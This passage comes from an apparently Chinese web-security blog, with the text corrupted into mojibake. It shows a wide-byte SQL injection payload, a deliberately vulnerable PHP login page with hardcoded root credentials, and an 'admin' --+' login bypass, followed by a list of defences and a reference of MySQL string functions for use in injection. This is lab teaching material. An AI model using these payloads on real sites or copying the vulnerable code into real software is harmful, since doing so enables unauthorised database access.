&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥ï¼š&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¯¹åº”é¡µé¢å¦‚ä¸‹ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307105837231.png"></p><p><strong>æ³¨å…¥è¯­å¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1%df&#39; union select 1,(select @@datadir),(select @@version_compile_os)--+</span><br></pre></td></tr></table></figure><p><strong>æ³¨å…¥ç»“æœï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307110636955.png"></p><p><strong>é˜²å¾¡æªæ–½ï¼š</strong></p><p>è®¾ç½®MySQLçš„å­—ç¬¦é›†ä¸º UTF-8ã€‚</p><h1 id="POSTæ³¨å…¥"><a href="#POSTæ³¨å…¥" class="headerlink" title="POSTæ³¨å…¥"></a>POSTæ³¨å…¥</h1><p>å½“å¯¹ä»¥POSTæ–¹å¼æäº¤çš„å‚æ•°æ— ä»»ä½•çš„è¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥ç”¨æˆ·åå’Œå¯†ç æ¥ä»æ•°æ®åº“ä¸­ç›´æ¥æŸ¥è¯¢ç»“æœå¹¶å®ç°ç™»å½•ç­‰æƒ…å†µï¼Œå¯ç›´æ¥æ„é€ ä¸€ä¸ªsqlè¯­å¥è¶Šè¿‡å¯†ç çš„ç¡®è®¤ï¼Œä¹Ÿå°±æ˜¯ä¿—ç§°çš„ä¸‡èƒ½å¯†ç <code>admin&#39; --+</code>æˆ–<code>admin&#39;#</code></p><p><strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SQLæ³¨å…¥æµ‹è¯•&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;./sql_login.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">ç”¨æˆ·å:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">å¯†ç ï¼š&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span>=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">        <span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&#x27;</span>.mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// é€‰æ‹©åº“</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"><span class="comment">// è®¾ç½®utf-8ç¼–ç </span></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line">        <span class="comment">// å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">        error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">// æ‹¼æ¥sqlè¯­å¥å¹¶æ‰§è¡Œ</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>] . <span class="string">&quot;ï¼Œæ‚¨å·²ç™»å½•æˆåŠŸï¼&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç™»å½•å¤±è´¥ï¼Œç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ï¼ˆè¯·è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç™»å½•ï¼‰&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;SQLæ‹¼æ¥ç»“æœï¼š&#x27;</span>.<span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>å¯¹åº”é¡µé¢å¦‚ä¸‹ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307173151304.png" alt="image-20210307173151304"></p><p><strong>æ„é€ ä¸‡èƒ½å¯†ç ç™»å½•ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307120812568.png"></p><p><strong>ä»¥å…¶ä»–æ–¹å¼è¿›è¡Œæ³¨å…¥ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307121042343.png"></p><h1 id="æ³¨å…¥æ¼æ´çš„é˜²å¾¡"><a href="#æ³¨å…¥æ¼æ´çš„é˜²å¾¡" class="headerlink" title="æ³¨å…¥æ¼æ´çš„é˜²å¾¡"></a>æ³¨å…¥æ¼æ´çš„é˜²å¾¡</h1><p><strong>ä»£ç æ–¹å‘</strong></p><ol><li>å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œä¾‹å¦‚<code>addslashes()</code> å‡½æ•°åœ¨æŒ‡å®šçš„é¢„å®šä¹‰å­—ç¬¦å‰æ·»åŠ åæ–œæ ï¼ŒæŠŠ<code>&#39;</code>è½¬ä¹‰ä¸º<code>\&#39; </code></li><li>å¯¹ç‰¹å®šçš„å…³é”®è¯è¿›è¡ŒåŒ¹é…è¿‡æ»¤ã€‚å¦‚å¯ä»¥æ£€æµ‹<code>select</code>ã€<code>from</code>ã€<code>union</code>ç­‰å…³é”®è¯ï¼Œå°†å…¶è¿‡æ»¤ã€‚</li><li>å¯¹æ•°æ®ç±»å‹åŠæ•°æ®é•¿åº¦è¿›è¡Œä¸¥æ ¼é™å®šï¼Œé˜²æ­¢ç”¨æˆ·è¾“å…¥è¿‡å¤šçš„æ— ç”¨æ•°æ®ã€‚</li><li>é‡‡ç”¨sqlè¯­å¥é¢„ç¼–è¯‘ï¼ŒSQLå¼•æ“ä¼šé¢„å…ˆè¿›è¡Œè¯­æ³•åˆ†æï¼Œäº§ç”Ÿè¯­æ³•æ ‘ï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåé¢æ— è®ºè¾“å…¥çš„æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¸ä¼šå½±å“è¯¥sqlè¯­å¥çš„ è¯­æ³•ç»“æ„ã€‚</li><li>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ä¼ å…¥çš„å‚æ•°ã€‚</li></ol><p><strong>æœåŠ¡å™¨æ–¹å‘</strong></p><ol><li>å¯¹æ•°æ®åº“é‡‡ç”¨æœ€å°æƒé™åˆ†é…ï¼Œå¦‚æ™®é€šç”¨æˆ·ä¸ç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™è¿›è¡Œä¸¥æ ¼çš„åŒºåˆ†ï¼Œè¿™æ ·å³ä½¿å¯ä»¥æ‹¿åˆ°æƒé™ä¹Ÿä¸ä¼šé€ æˆæ›´å¤§çš„æŸå¤±ã€‚</li><li>é¿å…æ˜¾ç¤ºSQLæ‰§è¡ŒæŠ¥é”™çš„ä¿¡æ¯ï¼Œé˜²æ­¢æŠ¥é”™ä¿¡æ¯è¢«åˆ©ç”¨ã€‚</li><li>æ•°æ®å±‚çš„ç¼–ç ç»Ÿä¸€ï¼Œé˜²æ­¢è¿‡æ»¤æ¨¡å‹è¢«ç»•è¿‡ã€‚</li></ol><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><blockquote><p>[1] <a href="https://www.cnblogs.com/wangyuyang1016/p/12172026.html">å¸¸è§çš„sqlæ³¨å…¥ç¯å¢ƒæ­å»º</a></p><p>[2] <a href="https://bu1.github.io/2021/01/06/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8%EF%BC%9A%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%89%8D%E7%BC%96%E5%86%99%E7%9A%84%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83/">ç¬¬åä¸€å‘¨ï¼šæ‰‹å·¥æµ‹è¯•ä¹‹å‰ç¼–å†™çš„æ³¨å…¥ç¯å¢ƒ</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLå‡½æ•°åŠææƒ</title>
      <link href="posts/22595.html"/>
      <url>posts/22595.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>åœ¨ sql æ³¨å…¥æ—¶ä¸ºäº†åº”å¯¹å„ç§é™åˆ¶æªæ–½ï¼Œåˆ©ç”¨æ•°æ®åº“è‡ªå¸¦çš„ä¸€äº›ç³»ç»Ÿå‡½æ•°ç»è¿‡å„ç§å˜æ¢ä¹‹åå¯ä»¥ç»•è¿‡ä¸€äº› å®‰å…¨è®¾å¤‡æˆ–è€…ä¸€äº›åŸºç¡€é˜²å¾¡çš„æªæ–½ï¼Œæ¯”å¦‚ä¸€äº›å­—ç¬¦ä¸²è½¬æ¢çš„å‡½æ•°ã€æˆªå–å­—ç¬¦ä¸²é•¿åº¦çš„å‡½æ•°ç­‰ï¼Œ</p><p> åº”ç”¨çš„åœºæ™¯åŒ…æ‹¬ï¼šé€šè¿‡æ³¨å…¥è·å–æ•°æ®ã€å˜æ¢å­—ç¬¦ä¸²ç»•è¿‡ WAFã€ç›²æ³¨çŒœè§£å­—ç¬¦æ•°æ®ç­‰ </p></blockquote><h1 id="MySQLè‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½ä¸ç”¨æ³•"><a href="#MySQLè‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½ä¸ç”¨æ³•" class="headerlink" title="MySQLè‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½ä¸ç”¨æ³•"></a>MySQLè‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½ä¸ç”¨æ³•</h1><h2 id="MySQL-å­—ç¬¦ä¸²å‡½æ•°"><a href="#MySQL-å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="MySQL å­—ç¬¦ä¸²å‡½æ•°"></a>MySQL å­—ç¬¦ä¸²å‡½æ•°</h2><p><strong>1.ASCII(s)</strong>   </p><p>è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ASCII(&#39;MySQL&#39;) AS NumCodeOfFirstChar;</span><br><span class="line">+--------------------+</span><br><span class="line">| NumCodeOfFirstChar |</span><br><span class="line">+--------------------+</span><br><span class="line">|                 77 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>2.CHAR_LENGTH(s)</strong></p><p>è¿”å›å­—ç¬¦ä¸² s çš„å­—ç¬¦æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CHAR_LENGTH(&quot;MySQL&quot;) AS LengthOfString;</span><br><span class="line">+----------------+</span><br><span class="line">| LengthOfString |</span><br><span class="line">+----------------+</span><br><span class="line">|              5 |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>3.CONCAT(s1,s2â€¦sn)</strong></p><p>å­—ç¬¦ä¸² s1,s2 ç­‰å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT (&#39;I&#39;,&#39; &#39;,&#39;am&#39;,&#39; &#39;,&#39;learning&#39;,&#39; &#39;,&#39;MySQL&#39;,&#39;.&#39;) AS ConcatenatedString;</span><br><span class="line">+----------------------+</span><br><span class="line">| ConcatenatedString   |</span><br><span class="line">+----------------------+</span><br><span class="line">| I am learning MySQL. |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„åŒºåˆ«  CONCAT_WS(x, s1,s2â€¦sn)</strong></p><p>åŒ CONCAT(s1,s2,â€¦) å‡½æ•°ï¼Œä½†æ˜¯æ¯ä¸ªå­—ç¬¦ä¸²ä¹‹é—´è¦åŠ ä¸Š xï¼Œx å¯ä»¥æ˜¯åˆ†éš”ç¬¦</p><p><strong>ä¸  group_concat( [DISTINCT] è¦è¿æ¥çš„å­—æ®µ [Order BY æ’åºå­—æ®µ ASC/DESC] [Separator â€˜åˆ†éš”ç¬¦â€™] )</strong></p><p>å¯é…åˆ<strong>group_by</strong>ä½¿ç”¨</p><p><strong>4.FIELD(s,s1,s2â€¦)</strong></p><p>è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸² s åœ¨å­—ç¬¦ä¸²åˆ—è¡¨(s1,s2â€¦)ä¸­çš„ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   3 |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.FIND_IN_SET(s1,s2)</strong></p><p>è¿”å›åœ¨å­—ç¬¦ä¸²s2ä¸­ä¸s1åŒ¹é…çš„å­—ç¬¦ä¸²çš„ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIND_IN_SET(&#39;c&#39;,&#39;a,b,c,d,e&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| FIND_IN_SET(&#39;c&#39;,&#39;a,b,c,d,e&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            3 |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.FORMAT(x,n)</strong></p><p>å‡½æ•°å¯ä»¥å°†æ•°å­— x è¿›è¡Œæ ¼å¼åŒ– â€œ#,###.##â€, å°† x ä¿ç•™åˆ°å°æ•°ç‚¹å n ä½ï¼Œæœ€åä¸€ä½å››èˆäº”å…¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT FORMAT(3.1415926535,4);</span><br><span class="line">+------------------------+</span><br><span class="line">| FORMAT(3.1415926535,4) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 3.1416                 |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><p><strong>7.INSERT(s1,x,len,s2)</strong></p><p>å­—ç¬¦ä¸² s2 æ›¿æ¢ s1 çš„ x ä½ç½®å¼€å§‹é•¿åº¦ä¸º len çš„å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT INSERT(&#39;MySQL&#39;,1,2,&#39;Your&#39;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| INSERT(&#39;MySQL&#39;,1,2,&#39;Your&#39;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| YourSQL                    |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>8.LOCATE(s1,s)</strong></p><p>ä»å­—ç¬¦ä¸² s ä¸­è·å– s1 çš„å¼€å§‹ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LOCATE(&#39;SQL&#39;,&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| LOCATE(&#39;SQL&#39;,&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     3 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>9.LOWER(s)|LCASE(s)</strong></p><p>å°†å­—ç¬¦ä¸² s çš„æ‰€æœ‰å­—æ¯å˜æˆå°å†™å­—æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOWER(&#39;MYSQL&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| LOWER(&#39;MYSQL&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| mysql          |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT LCASE(&#39;MYSQL&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| LCASE(&#39;MYSQL&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| mysql          |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>10.UPPER(s)|UCASE(s)</strong></p><p>å°†å­—ç¬¦ä¸² s çš„æ‰€æœ‰å­—æ¯å˜æˆå¤§å†™å­—æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT UPPER(&#39;mysql&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| UPPER(&#39;mysql&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| MYSQL          |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT UCASE(&#39;mysql&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| UCASE(&#39;mysql&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| MYSQL          |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>11.LEFT(s,n)</strong></p><p>è¿”å›å­—ç¬¦ä¸² s çš„å‰ n ä¸ªå­—ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEFT(&#39;MySQL&#39;,2);</span><br><span class="line">+-----------------+</span><br><span class="line">| LEFT(&#39;MySQL&#39;,2) |</span><br><span class="line">+-----------------+</span><br><span class="line">| My              |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>12.RIGHT(s,n)</strong></p><p>è¿”å›å­—ç¬¦ä¸² s çš„å n ä¸ªå­—ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RIGHT(&#39;MySQL&#39;,3);</span><br><span class="line">+------------------+</span><br><span class="line">| RIGHT(&#39;MySQL&#39;,3) |</span><br><span class="line">+------------------+</span><br><span class="line">| SQL              |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>13.LPAD(s1,len,s2)</strong></p><p>åœ¨å­—ç¬¦ä¸² s1 çš„å¼€å§‹å¤„å¡«å……å­—ç¬¦ä¸² s2ï¼Œä½¿å­—ç¬¦ä¸²é•¿åº¦è¾¾åˆ° len</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LPAD(&#39;SQL&#39;,7,&#39;My&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| LPAD(&#39;SQL&#39;,7,&#39;My&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| MyMySQL            |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>14.RPAD(s1,len,s2)</strong></p><p>åœ¨å­—ç¬¦ä¸² s1 çš„ç»“å°¾å¤„æ·»åŠ å­—ç¬¦ä¸² s2ï¼Œä½¿å­—ç¬¦ä¸²çš„é•¿åº¦è¾¾åˆ° len</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT RPAD (&#39;My&#39;,8,&#39;SQL&#39;);</span><br><span class="line">+---------------------+</span><br><span class="line">| RPAD (&#39;My&#39;,8,&#39;SQL&#39;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| MySQLSQL            |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p><strong>15.LTRIM(s)</strong></p><p>å»æ‰å­—ç¬¦ä¸² s å¼€å§‹å¤„çš„ç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LTRIM(&#39;      MySQL&#39;) AS LeftTrimmedString;</span><br><span class="line">+-------------------+</span><br><span class="line">| LeftTrimmedString |</span><br><span class="line">+-------------------+</span><br><span class="line">| MySQL             |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>16.RTRIM(s)</strong></p><p>å»æ‰å­—ç¬¦ä¸² s ç»“å°¾å¤„çš„ç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RTRIM (&#39;MySQL      &#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| RTRIM (&#39;MySQL      &#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| MySQL                 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>17.TRIM(s)</strong></p><p>å»æ‰å­—ç¬¦ä¸² s å¼€å§‹å’Œç»“å°¾å¤„çš„ç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TRIM(&#39;    MySQL    &#39;) AS TrimmedString;</span><br><span class="line">+---------------+</span><br><span class="line">| TrimmedString |</span><br><span class="line">+---------------+</span><br><span class="line">| MySQL         |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>18.MID(s,n,len)|SUBSTR(s, n, len)|SUBSTRING(s, n, len)</strong></p><p>ä»å­—ç¬¦ä¸² s çš„ n ä½ç½®æˆªå–é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(&#39;MySQL&#39;,3,3) AS ExtractString;</span><br><span class="line">+---------------+</span><br><span class="line">| ExtractString |</span><br><span class="line">+---------------+</span><br><span class="line">| SQL           |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>19.REPEAT(s,n)</strong></p><p>å°†å­—ç¬¦ä¸² s é‡å¤ n æ¬¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPEAT(&#39;MySQL&#39;,3);</span><br><span 